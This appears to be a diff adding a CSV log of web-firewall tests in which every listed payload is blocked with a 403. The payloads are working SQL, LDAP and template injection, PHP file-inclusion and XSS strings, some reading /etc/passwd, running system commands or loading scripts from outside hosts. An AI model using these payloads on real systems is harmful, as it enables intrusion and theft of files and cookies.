@@ -1,0 +1,1969 @@
+Status,Payload,HTTP Status,Content Length
+Blocked,*(|(mail=*)),403,3662
+Blocked,*(|(objectclass=*)),403,3662
+Blocked,x' or name()='username' or 'x'='y,403,3662
+Blocked,*)(uid=*))(|(uid=*,403,3662
+Blocked,php://filter/convert.base64-encode/resource=index,403,3662
+Blocked,php://filter/convert.base64-encode/resource=index.php,403,3662
+Blocked,php://filter/convert.base64-encode/resource=index.php%00,403,3662
+Blocked,php://filter/convert.base64-encode/resource=./index,403,3662
+Blocked,php://filter/convert.base64-encode/resource=../index.php,403,3662
+Blocked,php://filter/convert.base64-encode/resource=...//index.php,403,3662
+Blocked,php://filter/convert.base64-encode/resource=....//index.php,403,3662
+Blocked,php://filter/convert.base64-encode/resource=../index.php%00,403,3662
+Blocked,php://filter/convert.base64-encode/resource=...//index.php%00,403,3662
+Blocked,php://filter/convert.base64-encode/resource=....//index.php%00,403,3662
+Blocked,php://filter/convert.base64-encode/resource=/etc/passwd,403,3662
+Blocked,php://filter/convert.base64-encode/resource=/etc/passwd%00,403,3662
+Blocked,php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dindex,403,3662
+Blocked,php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dindex%2Ephp,403,3662
+Blocked,php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dindex%2Ephp%00,403,3662
+Blocked,php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3D%2Fetc%2Fpasswd,403,3662
+Blocked,php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3D%2Fetc%2Fpasswd%00,403,3662
+Blocked,php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dindex,403,3662
+Blocked,php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dindex%252Ephp,403,3662
+Blocked,php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dindex%252Ephp%00,403,3662
+Blocked,php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253D%252Fetc%252Fpasswd,403,3662
+Blocked,php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253D%252Fetc%252Fpasswd%00,403,3662
+Blocked,expect://ls,403,3662
+Blocked,expect%3A%2F%2Fls,403,3662
+Blocked,expect%253A%252F%252Fls,403,3662
+Blocked,expect://ls%00,403,3662
+Blocked,expect%3A%2F%2Fls%00,403,3662
+Blocked,expect%253A%252F%252Fls%00,403,3662
+Blocked,php://input,403,3662
+Blocked,php%3A%2F%2Finput,403,3662
+Blocked,php%253A%252F%252Finput,403,3662
+Blocked,php://input%00,403,3662
+Blocked,php%3A%2F%2Finput%00,403,3662
+Blocked,php%253A%252F%252Finput%00,403,3662
+Blocked,"db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",403,3662
+Blocked,';sleep(5000);,403,3662
+Blocked,)%20or%20('x'='x,403,3662
+Blocked,"benchmark(10000000,MD5(1))#",403,3662
+Blocked,""";waitfor delay '0:0:__TIME__'--",403,3662
+Blocked,1) or pg_sleep(__TIME__)--,403,3662
+Blocked,"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",403,3662
+Blocked,"""hi"""") or (""""a""""=""""a""",403,3662
+Blocked,""" or sleep(__TIME__)#",403,3662
+Blocked,pg_sleep(__TIME__)--,403,3662
+Blocked,*(|(objectclass=*)),403,3662
+Blocked,1) or sleep(__TIME__)#,403,3662
+Blocked,) or ('a'='a,403,3662
+Blocked,"1)) or benchmark(10000000,MD5(1))#",403,3662
+Blocked,"""a"""" or 3=3--""",403,3662
+Blocked,""" or benchmark(10000000,MD5(1))#",403,3662
+Blocked,1 waitfor delay '0:0:10'--,403,3662
+Blocked,"hi or 1=1 --""",403,3662
+Blocked,) or sleep(__TIME__)=',403,3662
+Blocked,")) or benchmark(10000000,MD5(1))#",403,3662
+Blocked,hi' or 'a'='a,403,3662
+Blocked,""")) or benchmark(10000000,MD5(1))#",403,3662
+Blocked,hi') or ('a'='a,403,3662
+Blocked,));waitfor delay '0:0:__TIME__'--,403,3662
+Blocked,a' waitfor delay '0:0:10'--,403,3662
+Blocked,"1;(load_file(char(47,101,116,99,47,112,97,115, ...",403,3662
+Blocked,1 or sleep(__TIME__)#,403,3662
+Blocked, and 1 in (select var from temp)--,403,3662
+Blocked,; exec master..xp_cmdshell 'ping 172.10.1.255'--,403,3662
+Blocked,""" or pg_sleep(__TIME__)--",403,3662
+Blocked,x' AND email IS NULL; --,403,3662
+Blocked,"1) or benchmark(10000000,MD5(1))#",403,3662
+Blocked,\x27UNION SELECT,403,3662
+Blocked,"""));waitfor delay '0:0:__TIME__'--",403,3662
+Blocked,%2A%28%7C%28objectclass%3D%2A%29%29,403,3662
+Blocked,) union select * from information_schema.tables;,403,3662
+Blocked,PRINT @@variable,403,3662
+Blocked,or isNULL(1/0) /*,403,3662
+Blocked,""" or ""a""=""a",403,3662
+Blocked,x' AND members.email IS NULL; --,403,3662
+Blocked," and 1=( if((load_file(char(110,46,101,120,11 ...",403,3662
+Blocked,1)) or pg_sleep(__TIME__)--,403,3662
+Blocked, union all select @@version--,403,3662
+Blocked,t'exec master..xp_cmdshell 'nslookup www.googl ...,403,3662
+Blocked,"1 or benchmark(10000000,MD5(1))#",403,3662
+Blocked,||UTL_HTTP.REQUEST,403,3662
+Blocked, or pg_sleep(__TIME__)--,403,3662
+Blocked,hi' or 'x'='x';,403,3662
+Blocked,""") or sleep(__TIME__)=""",403,3662
+Blocked, or 'whatever' in ('whatever'),403,3662
+Blocked," union select 1,load_file('/etc/passwd'),1,1,1;",403,3662
+Blocked,) or pg_sleep(__TIME__)--,403,3662
+Blocked, or sleep(__TIME__)#,403,3662
+Blocked, select * from information_schema.tables--,403,3662
+Blocked,a' or 1=1--,403,3662
+Blocked,a' or 'a' = 'a,403,3662
+Blocked, or sleep(__TIME__)=',403,3662
+Blocked,""" or isNULL(1/0) /*",403,3662
+Blocked,â or 1=1 --,403,3662
+Blocked, having 1=1--,403,3662
+Blocked,") or benchmark(10000000,MD5(1))#",403,3662
+Blocked,;waitfor delay '0:0:__TIME__'--,403,3662
+Blocked,""" or 1=1--",403,3662
+Blocked,x' AND userid IS NULL; --,403,3662
+Blocked," or benchmark(10000000,MD5(1))#",403,3662
+Blocked,""");waitfor delay '0:0:__TIME__'--",403,3662
+Blocked,a' or 3=3--,403,3662
+Blocked, group by userid having 1=1--,403,3662
+Blocked,; exec master..xp_cmdshell,403,3662
+Blocked,""")) or sleep(__TIME__)=""",403,3662
+Blocked,hi' or 1=1 --,403,3662
+Blocked,""") or pg_sleep(__TIME__)--",403,3662
+Blocked,Ã½ or 1=1 --,403,3662
+Blocked,1 or pg_sleep(__TIME__)--,403,3662
+Blocked,0 or 1=1,403,3662
+Blocked,%27%20or%201=1,403,3662
+Blocked,)) or pg_sleep(__TIME__)--,403,3662
+Blocked,x' AND 1=(SELECT COUNT(*) FROM tabname); --,403,3662
+Blocked,; or '1'='1',403,3662
+Blocked,1 or 1=1,403,3662
+Blocked,23 OR 1=1,403,3662
+Blocked,anything' OR 'x'='x,403,3662
+Blocked,1)) or sleep(__TIME__)#,403,3662
+Blocked,*(|(mail=*)),403,3662
+Blocked,);waitfor delay '0:0:__TIME__'--,403,3662
+Blocked,""") or benchmark(10000000,MD5(1))#",403,3662
+Blocked,)) or sleep(__TIME__)=',403,3662
+Blocked, or 1 in (select @@version)--,403,3662
+Blocked, union select * from users where login = char ...,403,3662
+Blocked,x' or 1=1 or 'x'='y,403,3662
+Blocked,â or 3=3 --,403,3662
+Blocked,"""a"""" or 1=1--""",403,3662
+Blocked,""" or 0=0 --",403,3662
+Blocked,""")) or pg_sleep(__TIME__)--",403,3662
+Blocked,' or 1=1,403,3662
+Blocked,x' OR full_name LIKE '%Bob%,403,3662
+Blocked,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,403,3662
+Blocked,'%20or%20''=',403,3662
+Blocked,'%20or%20'x'='x,403,3662
+Blocked,')%20or%20('x'='x,403,3662
+Blocked,' or 0=0 --,403,3662
+Blocked,' or 0=0 #,403,3662
+Blocked,' or 1=1--,403,3662
+Blocked,' or '1'='1'--,403,3662
+Blocked,' or 1 --',403,3662
+Blocked,' or 1=1 or ''=',403,3662
+Blocked,' or a=a--,403,3662
+Blocked,') or ('a'='a,403,3662
+Blocked,'hi' or 'x'='x';,403,3662
+Blocked,' or username like '%,403,3662
+Blocked,' or uname like '%,403,3662
+Blocked,' or userid like '%,403,3662
+Blocked,' or uid like '%,403,3662
+Blocked,' or user like '%,403,3662
+Blocked,'; exec master..xp_cmdshell,403,3662
+Blocked,'; exec xp_regread,403,3662
+Blocked,t'exec master..xp_cmdshell 'nslookup www.google.com'--,403,3662
+Blocked,#NAME?,403,3662
+Blocked,' UNION SELECT,403,3662
+Blocked,' UNION ALL SELECT,403,3662
+Blocked,'||UTL_HTTP.REQUEST,403,3662
+Blocked,1;SELECT%20*,403,3662
+Blocked,'%20or%201=1,403,3662
+Blocked,' or ''=',403,3662
+Blocked,' or 3=3,403,3662
+Blocked,sleep(__TIME__)#,403,3662
+Blocked,1 or sleep(__TIME__)#,403,3662
+Blocked,""" or sleep(__TIME__)#",403,3662
+Blocked,' or sleep(__TIME__)#,403,3662
+Blocked,""" or sleep(__TIME__)=""",403,3662
+Blocked,' or sleep(__TIME__)=',403,3662
+Blocked,1) or sleep(__TIME__)#,403,3662
+Blocked,""") or sleep(__TIME__)=""",403,3662
+Blocked,') or sleep(__TIME__)=',403,3662
+Blocked,1)) or sleep(__TIME__)#,403,3662
+Blocked,""")) or sleep(__TIME__)=""",403,3662
+Blocked,')) or sleep(__TIME__)=',403,3662
+Blocked,;waitfor delay '0:0:__TIME__'--,403,3662
+Blocked,);waitfor delay '0:0:__TIME__'--,403,3662
+Blocked,';waitfor delay '0:0:__TIME__'--,403,3662
+Blocked,""";waitfor delay '0:0:__TIME__'--",403,3662
+Blocked,');waitfor delay '0:0:__TIME__'--,403,3662
+Blocked,""");waitfor delay '0:0:__TIME__'--",403,3662
+Blocked,));waitfor delay '0:0:__TIME__'--,403,3662
+Blocked,'));waitfor delay '0:0:__TIME__'--,403,3662
+Blocked,"""));waitfor delay '0:0:__TIME__'--",403,3662
+Blocked,"benchmark(10000000,MD5(1))#",403,3662
+Blocked,"1 or benchmark(10000000,MD5(1))#",403,3662
+Blocked,""" or benchmark(10000000,MD5(1))#",403,3662
+Blocked,"' or benchmark(10000000,MD5(1))#",403,3662
+Blocked,"1) or benchmark(10000000,MD5(1))#",403,3662
+Blocked,""") or benchmark(10000000,MD5(1))#",403,3662
+Blocked,"') or benchmark(10000000,MD5(1))#",403,3662
+Blocked,"1)) or benchmark(10000000,MD5(1))#",403,3662
+Blocked,""")) or benchmark(10000000,MD5(1))#",403,3662
+Blocked,"')) or benchmark(10000000,MD5(1))#",403,3662
+Blocked,pg_sleep(__TIME__)--,403,3662
+Blocked,1 or pg_sleep(__TIME__)--,403,3662
+Blocked,""" or pg_sleep(__TIME__)--",403,3662
+Blocked,' or pg_sleep(__TIME__)--,403,3662
+Blocked,1) or pg_sleep(__TIME__)--,403,3662
+Blocked,""") or pg_sleep(__TIME__)--",403,3662
+Blocked,') or pg_sleep(__TIME__)--,403,3662
+Blocked,1)) or pg_sleep(__TIME__)--,403,3662
+Blocked,""")) or pg_sleep(__TIME__)--",403,3662
+Blocked,')) or pg_sleep(__TIME__)--,403,3662
+Blocked,' or '1' = '1,403,3662
+Blocked,group_concat(table_name),403,3662
+Blocked,concat/*!(table_name)*/,403,3662
+Blocked,"' || (select sql from sqlite_master) || '<pre><!--#exec cmd=""ls"" --></pre>",403,3662
+Blocked,{{'a'.toUpperCase()}} ,403,3662
+Blocked,"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",403,3662
+Blocked,"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",403,3662
+Blocked,"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",403,3662
+Blocked,"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",403,3662
+Blocked,${T(java.lang.System).getenv()},403,3662
+Blocked,${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},403,3662
+Blocked,"${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system(""id"")}",403,3662
+Blocked,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",403,3662
+Blocked,"0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",403,3662
+Blocked,"<script/src=data:,alert()>",403,3662
+Blocked,<marquee/onstart=alert()>,403,3662
+Blocked,<video/poster/onerror=alert()>,403,3662
+Blocked,<isindex/autofocus/onfocus=alert()>,403,3662
+Blocked,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,403,3662
+Blocked,"<IMG SRC=""javascript:alert('XSS');"">",403,3662
+Blocked,<IMG SRC=javascript:alert('XSS')>,403,3662
+Blocked,<IMG SRC=JaVaScRiPt:alert('XSS')>,403,3662
+Blocked,"<IMG SRC=javascript:alert(""XSS"")>",403,3662
+Blocked,"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",403,3662
+Blocked,"<a onmouseover=""alert(document.cookie)"">xxs link</a>",403,3662
+Blocked,<a onmouseover=alert(document.cookie)>xxs link</a>,403,3662
+Blocked,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",403,3662
+Blocked,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",403,3662
+Blocked,"<IMG SRC= onmouseover=""alert('xxs')"">",403,3662
+Blocked,"<IMG onmouseover=""alert('xxs')"">",403,3662
+Blocked,"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>",403,3662
+Blocked,"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",403,3662
+Blocked,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,403,3662
+Blocked,<SCRIPT SRC=//ha.ckers.org/.j>,403,3662
+Blocked,"<IMG SRC=""javascript:alert('XSS')""",403,3662
+Blocked,<iframe src=http://ha.ckers.org/scriptlet.html <,403,3662
+Blocked,</script><script>alert('XSS');</script>,403,3662
+Blocked,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",403,3662
+Blocked,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",403,3662
+Blocked,"<BODY BACKGROUND=""javascript:alert('XSS')"">",403,3662
+Blocked,"<IMG DYNSRC=""javascript:alert('XSS')"">",403,3662
+Blocked,"<IMG LOWSRC=""javascript:alert('XSS')"">",403,3662
+Blocked,"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",403,3662
+Blocked,"<IMG SRC='vbscript:msgbox(""XSS"")'>",403,3662
+Blocked,"<IMG SRC=""livescript:[code]"">",403,3662
+Blocked,<BODY ONLOAD=alert('XSS')>,403,3662
+Blocked,"<BGSOUND SRC=""javascript:alert('XSS');"">",403,3662
+Blocked,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",403,3662
+Blocked,"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",403,3662
+Blocked,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,403,3662
+Blocked,"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",403,3662
+Blocked,"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",403,3662
+Blocked,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",403,3662
+Blocked,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",403,3662
+Blocked,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",403,3662
+Blocked,"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",403,3662
+Blocked,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",403,3662
+Blocked,"<XSS STYLE=""xss:expression(alert('XSS'))"">",403,3662
+Blocked,"<XSS STYLE=""behavior: url(xss.htc);"">",403,3662
+Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",403,3662
+Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",403,3662
+Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",403,3662
+Blocked,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",403,3662
+Blocked,"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",403,3662
+Blocked,"<TABLE BACKGROUND=""javascript:alert('XSS')"">",403,3662
+Blocked,"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",403,3662
+Blocked,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",403,3662
+Blocked,"<DIV STYLE=""width: expression(alert('XSS'));"">",403,3662
+Blocked,<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,403,3662
+Blocked,"<BASE HREF=""javascript:alert('XSS');//"">",403,3662
+Blocked,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",403,3662
+Blocked,"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",403,3662
+Blocked,"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",403,3662
+Blocked,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",403,3662
+Blocked,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",403,3662
+Blocked,"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<A HREF=""http://66.102.7.147/"">XSS</A>",403,3662
+Blocked,"0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-""",403,3662
+Blocked,veris-->group<svg/onload=alert(/XSS/)//,403,3662
+Blocked,element[attribute='<img src=x onerror=alert('XSS');>,403,3662
+Blocked,"[<blockquote cite=""]"">["" onmouseover=""alert('RVRSH3LL_XSS');"" ]",403,3662
+Blocked,javascript:alert%281%29;,403,3662
+Blocked,<w contenteditable id=x onfocus=alert()>,403,3662
+Blocked,<svg/onload=%26%23097lert%26lpar;1337)>,403,3662
+Blocked,<script>for((i)in(self))eval(i)(1)</script>,403,3662
+Blocked,"<a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a>",403,3662
+Blocked,<svg onload=alert(1)>,403,3662
+Blocked,"""><svg onload=alert(1)//",403,3662
+Blocked,"""onmouseover=alert(1)//",403,3662
+Blocked,"""autofocus/onfocus=alert(1)//",403,3662
+Blocked,'-alert(1)-',403,3662
+Blocked,'-alert(1)//,403,3662
+Blocked,</script><svg onload=alert(1)>,403,3662
+Blocked,<x contenteditable onblur=alert(1)>lose focus! ,403,3662
+Blocked,<x onclick=alert(1)>click this! ,403,3662
+Blocked,<x oncopy=alert(1)>copy this! ,403,3662
+Blocked,<x oncontextmenu=alert(1)>right click this! ,403,3662
+Blocked,<x oncut=alert(1)>copy this! ,403,3662
+Blocked,<x ondblclick=alert(1)>double click this! ,403,3662
+Blocked,<x ondrag=alert(1)>drag this! ,403,3662
+Blocked,<x contenteditable onfocus=alert(1)>focus this! ,403,3662
+Blocked,<x contenteditable oninput=alert(1)>input here! ,403,3662
+Blocked,<x contenteditable onkeydown=alert(1)>press any key! ,403,3662
+Blocked,<x contenteditable onkeypress=alert(1)>press any key! ,403,3662
+Blocked,<x contenteditable onkeyup=alert(1)>press any key! ,403,3662
+Blocked,<x onmousedown=alert(1)>click this! ,403,3662
+Blocked,<x onmousemove=alert(1)>hover this! ,403,3662
+Blocked,<x onmouseout=alert(1)>hover this! ,403,3662
+Blocked,<x onmouseover=alert(1)>hover this! ,403,3662
+Blocked,<x onmouseup=alert(1)>click this! ,403,3662
+Blocked,<x contenteditable onpaste=alert(1)>paste here!,403,3662
+Blocked,<script>alert(1)// ,403,3662
+Blocked,<script>alert(1)<!–,403,3662
+Blocked,<script src=//brutelogic.com.br/1.js> ,403,3662
+Blocked,<script src=//3334957647/1>,403,3662
+Blocked,%3Cx onxxx=alert(1) ,403,3662
+Blocked,"<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",403,3662
+Blocked,'onload=alert(1)><svg/1=',403,3662
+Blocked,'>alert(1)</script><script/1=' ,403,3662
+Blocked,"*/alert(1)"">'onload=""/*<svg/1='",403,3662
+Blocked,"`-alert(1)"">'onload=""`<svg/1='",403,3662
+Blocked,*/</script>'>alert(1)/*<script/1=',403,3662
+Blocked,<script>alert(1)</script> ,403,3662
+Blocked,<script src=javascript:alert(1)> ,403,3662
+Blocked,<iframe src=javascript:alert(1)> ,403,3662
+Blocked,<embed src=javascript:alert(1)> ,403,3662
+Blocked,<a href=javascript:alert(1)>click ,403,3662
+Blocked,<math><brute href=javascript:alert(1)>click ,403,3662
+Blocked,<form action=javascript:alert(1)><input type=submit> ,403,3662
+Blocked,<isindex action=javascript:alert(1) type=submit value=click> ,403,3662
+Blocked,<form><button formaction=javascript:alert(1)>click ,403,3662
+Blocked,<form><input formaction=javascript:alert(1) type=submit value=click> ,403,3662
+Blocked,<form><input formaction=javascript:alert(1) type=image value=click> ,403,3662
+Blocked,<form><input formaction=javascript:alert(1) type=image src=SOURCE> ,403,3662
+Blocked,<isindex formaction=javascript:alert(1) type=submit value=click> ,403,3662
+Blocked,<object data=javascript:alert(1)> ,403,3662
+Blocked,<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> ,403,3662
+Blocked,"<svg><script xlink:href=data:,alert(1) /> ",403,3662
+Blocked,<math><brute xlink:href=javascript:alert(1)>click ,403,3662
+Blocked,<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>,403,3662
+Blocked,<html ontouchstart=alert(1)> ,403,3662
+Blocked,<html ontouchend=alert(1)> ,403,3662
+Blocked,<html ontouchmove=alert(1)> ,403,3662
+Blocked,<html ontouchcancel=alert(1)>,403,3662
+Blocked,<body onorientationchange=alert(1)>,403,3662
+Blocked,"""><img src=1 onerror=alert(1)>.gif",403,3662
+Blocked,"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",403,3662
+Blocked,GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,403,3662
+Blocked,"""><script src=data:&comma;alert(1)//",403,3662
+Blocked,"""><script src=//brutelogic.com.br&sol;1.js&num; ",403,3662
+Blocked,"<link rel=import href=""data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; ",403,3662
+Blocked,"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",403,3662
+Blocked,<base href=//0>,403,3662
+Blocked,<body onload=alert(1)>,403,3662
+Blocked,<body onpageshow=alert(1)>,403,3662
+Blocked,<body onfocus=alert(1)>,403,3662
+Blocked,<body onhashchange=alert(1)><a href=#x>click this!#x,403,3662
+Blocked,<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x,403,3662
+Blocked,<body onscroll=alert(1)><br><br><br><br>,403,3662
+Blocked,<body onresize=alert(1)>press F12!,403,3662
+Blocked,<body onhelp=alert(1)>press F1! (MSIE),403,3662
+Blocked,<marquee onstart=alert(1)>,403,3662
+Blocked,<marquee loop=1 width=0 onfinish=alert(1)>,403,3662
+Blocked,<audio src onloadstart=alert(1)>,403,3662
+Blocked,<video onloadstart=alert(1)><source>,403,3662
+Blocked,<input autofocus onblur=alert(1)>,403,3662
+Blocked,<keygen autofocus onfocus=alert(1)>,403,3662
+Blocked,<form onsubmit=alert(1)><input type=submit>,403,3662
+Blocked,<select onchange=alert(1)><option>1<option>2,403,3662
+Blocked,<menu id=x contextmenu=x onshow=alert(1)>right click me!,403,3662
+Blocked,alert`1`,403,3662
+Blocked,(alert)(1),403,3662
+Blocked,"a=alert,a(1)",403,3662
+Blocked,[1].find(alert),403,3662
+Blocked,al\u0065rt(1),403,3662
+Blocked,top['al\145rt'](1),403,3662
+Blocked,top['al\x65rt'](1),403,3662
+Blocked,top[8680439..toString(30)](1),403,3662
+Blocked,"xXx%5c%5c%5c%C0%A2xXx//xXx\\\""xXxUTF-83'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E",403,3662
+Blocked,<<scr\0ipt/src=http://xss.com/xss.js></script,403,3662
+Blocked,%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E,403,3662
+Blocked,' onmouseover=alert(/XSS/),403,3662
+Blocked,"""><iframe%20src=""http://google.com""%%203E",403,3662
+Blocked,'<script>window.onload=function(){document.forms[0].message.value='1';}</script>,403,3662
+Blocked,x”</title><img src%3dx onerror%3dalert(1)>,403,3662
+Blocked,<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>,403,3662
+Blocked,"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>",403,3662
+Blocked,"<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>",403,3662
+Blocked,"<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>",403,3662
+Blocked,<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,403,3662
+Blocked,"<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>",403,3662
+Blocked,<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,403,3662
+Blocked,<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>,403,3662
